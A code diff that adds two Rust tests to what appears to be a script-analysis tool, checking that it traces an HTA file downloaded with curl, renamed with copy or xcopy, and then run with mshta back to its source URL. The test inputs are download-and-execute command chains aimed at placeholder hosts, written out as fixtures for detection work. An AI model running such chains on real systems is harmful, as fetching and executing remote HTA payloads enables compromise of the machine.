@@ -14804,6 +14804,7 @@ http.Send"#;
 mod copy_multi_source_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
+    use crate::traits::Trait;
 
     #[test]
     fn copy_b_multi_source_concat_tracked() {
@@ -14843,6 +14844,50 @@ mod copy_multi_source_tests {
             }
             _ => panic!("unexpected entry: {:?}", entry),
         }
+    }
+
+    #[test]
+    fn copy_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://copy-download.example/payload.hta
+copy original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-download.example/payload.hta"
+                )
+            }),
+            "copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://xcopy-download.example/payload.hta
+xcopy /y original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://xcopy-download.example/payload.hta"
+                )
+            }),
+            "xcopied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
     }
 }
 
